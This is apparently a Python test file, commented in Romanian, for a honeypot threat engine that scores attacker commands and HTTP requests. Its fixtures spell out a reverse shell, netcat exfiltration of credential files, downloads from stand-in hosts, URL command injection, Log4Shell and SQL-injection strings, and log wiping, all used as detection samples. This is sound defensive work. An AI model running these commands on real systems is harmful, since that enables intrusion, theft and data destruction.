# Ruleaza din folderul threat-engine:  python test_filters.py
# Fiecare test verifica o regula. Daca ceva s-a stricat, vezi exact care.

import os
import re

from filters import check_event, command_words, is_internal, build_alert, BruteForceTracker, HONEYTOKENS
from scoring import score_to_severity
from sessions import group_sessions, session_summary, SessionStore
from recommendations import recommend, DEFAULT_RECOMMENDATION
from stats import LiveStats
from profiles import attacker_profile
from correlation import correlate, jaccard
from clustering import cluster, behavior_signature
from blocklist import build_blocklist, dangerous_ips
from attack_techniques import technique_for, navigator_layer


def command(text, url=""):
    return {"event_type": "command_exec", "source_ip": "1.2.3.4",
            "payload_details": {"command": text, "extracted_url": url}}


def http(path):
    return {"event_type": "http_request", "source_ip": "1.2.3.4",
            "payload_details": {"http_path": path}}


def login(user, password, success, second, ip="1.2.3.4", session="s1"):
    return {"event_type": "login_attempt", "source_ip": ip, "session_id": session,
            "timestamp": f"2026-11-17T10:00:{second:02d}.000Z",
            "credentials": {"username": user, "password": password, "success": success}}


def score(event, tracker=None):
    return check_event(event, tracker)[1]


def severity(event, tracker=None):
    return score_to_severity(check_event(event, tracker)[1])


# --- scorul: severitatea iese din puncte, nu e fixa ------------------------

def test_score_bands():
    assert score_to_severity(0) == "NONE"
    assert score_to_severity(5) == "LOW"
    assert score_to_severity(15) == "MEDIUM"
    assert score_to_severity(30) == "HIGH"
    assert score_to_severity(50) == "CRITICAL"


def test_command_words():
    assert command_words("cd /tmp; /bin/busybox wget x") == ["cd", "tmp", "busybox", "wget", "x"]


def test_id_is_a_whole_word():
    assert score(command("cat android.txt")) == 0          # "android" contine "id", dar nu e cuvant
    assert score(command("whoami && id")) == 6             # recunoscut, dar doar recunoastere = putine puncte


def test_download_is_serious():
    assert score(command("wget http://x/bot", "http://x/bot")) == 40
    assert severity(command("wget http://x/bot", "http://x/bot")) == "HIGH"


def test_mirai_probes():
    assert score(command("/bin/busybox ECCHI")) == 8
    assert score(command("echo -e '\\x6b\\x61\\x6d\\x69'")) == 10


def test_persistence_and_cleanup():
    assert severity(command("echo k >> ~/.ssh/authorized_keys")) == "CRITICAL"
    assert score(command("rm -rf /var/log/*")) == 30


def test_http_rules():
    assert severity(http("/index.php?id=1%27%20OR%20%271%27=%271")) == "HIGH"
    assert severity(http("/?x=${jndi:ldap://1.2.3.4/a}")) == "CRITICAL"
    assert score(http("/%252e%252e/etc/passwd")) == 15     # decodat de doua ori
    assert score(http("/")) == 0


def test_internal_ip():
    assert is_internal({"source_ip": "192.168.1.20"}) is True
    assert is_internal({"source_ip": "8.8.8.8"}) is False


def test_successful_login():
    assert severity(login("root", "root", True, 0)) == "CRITICAL"


def test_brute_force_scales_with_attempts():
    tracker = BruteForceTracker()
    scores = []
    for second in range(10):
        scores.append(score(login("root", f"p{second}", False, second), tracker))
    # prima incercare pe root = 8; a 5-a declanseaza brute force = 20 + 5 = 25; restul tac
    assert scores == [8, 0, 0, 0, 25, 0, 0, 0, 0, 0]


def test_session_stages():
    events = [
        login("root", "x", False, 0),
        login("root", "root", True, 1),
        command("cd /tmp; wget http://x/bot", "http://x/bot"),
        command("echo '* * * * * /tmp/bot' | crontab -"),
    ]
    for second, event in enumerate(events):
        event["session_id"] = "s1"
        event["timestamp"] = f"2026-11-17T10:00:{second:02d}.000Z"
    summary = session_summary("s1", group_sessions(events)["s1"])
    assert summary["stages"] == ["conectare", "incercare login", "login reusit", "comenzi", "descarcare", "persistenta"]
    assert summary["successful_login"] == "root:root"
    assert summary["passwords"] == ["x", "root"]


def test_every_rule_has_a_recommendation():
    events = [
        command("wget http://x/bot", "http://x/bot"), command("bash -i >& /dev/tcp/1.2.3.4/1 0>&1"),
        command("echo k >> ~/.ssh/authorized_keys"), command("rm -rf /var/log/*"),
        command("cat /etc/shadow"), command("chmod +x bot"), command("/bin/busybox ECCHI"),
        command("uname -a"), command("crontab -l"), command("python -c 'x'"),
        http("/?x=${jndi:ldap://a/b}"), http("/?id=1' or '1'='1"), http("/.env"), http("/../../x"),
        http("/?cmd=ls"), http("/?q=<script>"), login("root", "root", True, 0),
    ]
    for event in events:
        is_threat, points, reason = check_event(event)
        alert = build_alert(event, points, reason)
        assert alert["recommendation"] != DEFAULT_RECOMMENDATION, reason
        assert alert["severity"] == score_to_severity(points)


def test_behavior_builds_the_profile_score():
    # un bot care doar scaneaza aduna putine puncte; unul care intra + descarca + persistenta, multe
    scanner = [{"source_ip": "1.1.1.1", "severity": "LOW", "score": 6, "protocol": "HTTP"}]
    full = [{"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"},
            {"source_ip": "2.2.2.2", "severity": "HIGH", "score": 40, "protocol": "SSH"},
            {"source_ip": "2.2.2.2", "severity": "CRITICAL", "score": 45, "protocol": "SSH"}]
    p_scan = attacker_profile("1.1.1.1", [], scanner, 1)
    p_full = attacker_profile("2.2.2.2", [], full, 3)
    assert p_scan["threat_score"] == 6 and p_scan["overall_severity"] == "LOW"
    assert p_full["threat_score"] == 130 and p_full["overall_severity"] == "CRITICAL"


def test_stats_count_everything():
    stats = LiveStats()
    stats.add_event(login("root", "123", False, 0))
    stats.add_event(login("root", "123", False, 1))
    stats.add_alert({"severity": "HIGH", "protocol": "ssh", "source_ip": "1.2.3.4"})
    data = stats.to_dict()
    assert data["total_events"] == 2
    assert data["top_credentials"] == [{"credentials": "root:123", "count": 2}]
    assert data["alerts_by_protocol"] == {"SSH": 1}


def test_correlation_recovers_a_botnet():
    # 3 IP-uri diferite descarca de pe ACELASI server -> o singura campanie
    summaries = []
    for n in range(3):
        summaries.append({"source_ip": f"9.9.9.{n}", "downloads": ["http://evil.example/bins/m.arm7"],
                          "passwords": ["admin"]})
    # un IP fara legatura cu ceilalti
    summaries.append({"source_ip": "5.5.5.5", "downloads": ["http://alt.example/x"], "passwords": ["parola"]})
    campaigns = correlate(summaries)
    assert len(campaigns) == 1
    assert campaigns[0]["ips"] == ["9.9.9.0", "9.9.9.1", "9.9.9.2"]
    assert jaccard({"a", "b"}, {"a", "b"}) == 1.0


def test_attack_technique_tagging():
    assert technique_for("atac brute-force detectat (5 parole gresite)")[0] == "T1110"
    assert technique_for("login REUSIT cu root:root")[0] == "T1078"
    assert technique_for("incercare de descarcare: http://x/bot")[0] == "T1105"
    assert technique_for("ceva necunoscut") is None
    # layer-ul pentru Navigator numara tehnicile
    alerts = [{"alert_reason": "login REUSIT cu root:root"}, {"alert_reason": "login REUSIT cu admin:admin"}]
    layer = navigator_layer(alerts)
    assert layer["techniques"][0] == {"techniqueID": "T1078", "score": 2, "comment": "Valid Accounts"}


def test_clustering_groups_similar_behavior():
    # 2 boti IoT care se poarta la fel (telnet + busybox + descarcare) -> o familie
    def iot(ip):
        return {"source_ip": ip, "protocol": "TELNET",
                "commands": ["/bin/busybox ECCHI", "wget http://x/m.arm7"],
                "stages": ["conectare", "login reusit", "comenzi", "descarcare"]}
    scanner = {"source_ip": "7.7.7.7", "protocol": "HTTP", "commands": [], "stages": ["conectare"]}
    families = cluster([iot("1.1.1.1"), iot("2.2.2.2"), scanner])
    assert len(families) == 1
    assert families[0]["ips"] == ["1.1.1.1", "2.2.2.2"]
    assert families[0]["label"] == "botnet IoT (tip Mirai)"


def http_login(path, user, password, ip="1.2.3.4", second=0):
    event = login(user, password, False, second, ip)
    event["protocol"] = "HTTP"
    event["payload_details"] = {"http_path": path}
    return event


def test_http_login_also_checks_the_path():
    # parola din URL nu mai ascunde exploit-ul din cale: se pastreaza scorul mai mare
    event = http_login("/login.cgi?user=admin;wget+http://203.0.113.5/x", "admin", "admin")
    assert score(event, BruteForceTracker()) == 30
    assert "ruleze comenzi" in check_event(event)[2]
    assert severity(http_login("/?x=${jndi:ldap://a/b}", "admin", "x")) == "CRITICAL"
    # fara exploit in cale ramane regula de login
    assert score(http_login("/login.cgi?user=admin", "admin", "x")) == 8
    # pe SSH nu exista cale
    assert score(login("admin", "x", False, 0)) == 8


def test_command_injection_in_url():
    assert score(http("/cgi-bin/;wget%20http://203.0.113.5/x.sh")) == 30
    assert score(http("/shell?cd+/tmp;curl+-O+http://203.0.113.5/x")) == 30


def test_honeytoken_file_read():
    assert severity(command("cat /etc/hostapd.conf")) == "MEDIUM"
    assert severity(command("cd /etc/ppp; cat chap-secrets")) == "MEDIUM"   # doar numele, fara cale
    assert "fisier-momeala" in check_event(command("grep wpa /etc/hostapd.conf"))[2]
    # nu se pierde in spatele unei reguli mai slabe...
    assert score(command("uname -a; cat /etc/hostapd.conf")) == 20
    # ...dar nici nu acopera una mai grava (exfiltrare cu netcat)
    assert score(command("cat /etc/ppp/chap-secrets | nc 203.0.113.5 80")) == 30


def test_honeytoken_login_beats_brute_force():
    tracker = BruteForceTracker()
    scores = []
    for second in range(3):
        scores.append(score(login("root", f"p{second}", False, second), tracker))
    # parola Wi-Fi in mijlocul unui brute force: nu se pierde printre parolele gresite
    scores.append(score(login("root", "w7Kq2mVx9pLz", False, 3), tracker))
    scores.append(score(login("root", "p4", False, 4), tracker))
    # dar s-a numarat ca parola gresita: a 5-a greseala declanseaza brute force
    assert scores == [8, 0, 0, 50, 25]
    assert severity(login("2210417553", "x", False, 0)) == "CRITICAL"            # userul PPPoE
    assert severity(login("admin", '"Rp4tHx92kQ"', False, 0)) == "CRITICAL"      # copiat cu ghilimele
    assert severity(http_login("/login.cgi", "W7KQ2MVX9PLZ", "x")) == "NONE"    # alt text, nu e secretul
    reason = check_event(login("admin", "w7Kq2mVx9pLz", False, 0))[2]
    assert "hostapd.conf" in reason      # dashboard-ul o marcheaza HONEYTOKEN dupa numele fisierului


def test_honeytoken_alerts_are_tagged():
    read = build_alert(command("cat /etc/hostapd.conf"), 20, check_event(command("cat /etc/hostapd.conf"))[2])
    used = login("admin", "Rp4tHx92kQ", False, 0)
    used = build_alert(used, 50, check_event(used)[2])
    assert read["technique"] == "T1552.001" and used["technique"] == "T1078"
    assert read["recommendation"] != DEFAULT_RECOMMENDATION
    assert used["recommendation"] != DEFAULT_RECOMMENDATION


def test_correlation_links_honeytoken_reader_and_user():
    reader = {"source_ip": "9.9.9.1", "commands": ["cat /etc/ppp/chap-secrets"], "passwords": ["admin"]}
    user = {"source_ip": "8.8.8.2", "commands": [], "passwords": ["x"], "usernames": ["2210417553"]}
    other = {"source_ip": "7.7.7.3", "commands": ["cat /etc/hostapd.conf"], "passwords": []}
    campaigns = correlate([reader, user, other])
    assert len(campaigns) == 1
    assert campaigns[0]["ips"] == ["8.8.8.2", "9.9.9.1"]
    assert campaigns[0]["reasons"] == ["un IP a citit fisierul-momeala, altul i-a folosit secretul"]


def test_session_keeps_usernames():
    events = [login("2210417553", "x", False, 0), login("admin", "y", False, 1)]
    summary = session_summary("s1", group_sessions(events)["s1"])
    assert summary["usernames"] == ["2210417553", "admin"]


def test_honeytokens_match_the_agent():
    # aceleasi secrete ca in agent (fs.go). In containerul threat-engine fisierul Go nu exista.
    path = os.path.join(os.path.dirname(os.path.abspath(__file__)),
                        "..", "honeypot-agent", "internal", "vfs", "fs.go")
    if not os.path.exists(path):
        return
    with open(path, encoding="utf-8") as f:
        source = f.read()
    in_go = re.findall(r'(?:wifiPassphrase|pppoeUser|pppoePassword)\s*=\s*"([^"]*)"', source)
    in_python = [token[0] for token in HONEYTOKENS]
    assert sorted(in_go) == sorted(in_python), f"fs.go are {in_go}, filters.py are {in_python}"


def test_blocklist_filters_by_score():
    alerts = [
        {"source_ip": "1.1.1.1", "score": 45},   # grav -> intra
        {"source_ip": "2.2.2.2", "score": 6},    # usor -> nu intra
        {"source_ip": "1.1.1.1", "score": 40},   # acelasi IP, se aduna
    ]
    chosen = dangerous_ips(alerts, min_score=25)
    assert chosen == [("1.1.1.1", 85)]
    assert "1.1.1.1" in build_blocklist(alerts, "nftables")
    assert "2.2.2.2" not in build_blocklist(alerts)


if __name__ == "__main__":
    tests = [
        test_score_bands, test_command_words, test_id_is_a_whole_word, test_download_is_serious,
        test_mirai_probes, test_persistence_and_cleanup, test_http_rules, test_internal_ip,
        test_successful_login, test_brute_force_scales_with_attempts, test_session_stages,
        test_every_rule_has_a_recommendation, test_behavior_builds_the_profile_score,
        test_stats_count_everything, test_correlation_recovers_a_botnet,
        test_attack_technique_tagging, test_clustering_groups_similar_behavior,
        test_blocklist_filters_by_score, test_http_login_also_checks_the_path,
        test_command_injection_in_url, test_honeytoken_file_read, test_honeytoken_login_beats_brute_force,
        test_honeytoken_alerts_are_tagged, test_correlation_links_honeytoken_reader_and_user,
        test_session_keeps_usernames, test_honeytokens_match_the_agent,
    ]
    for test in tests:
        test()
        print(f"OK  {test.__name__}")
    print(f"\nToate cele {len(tests)} teste au trecut.")
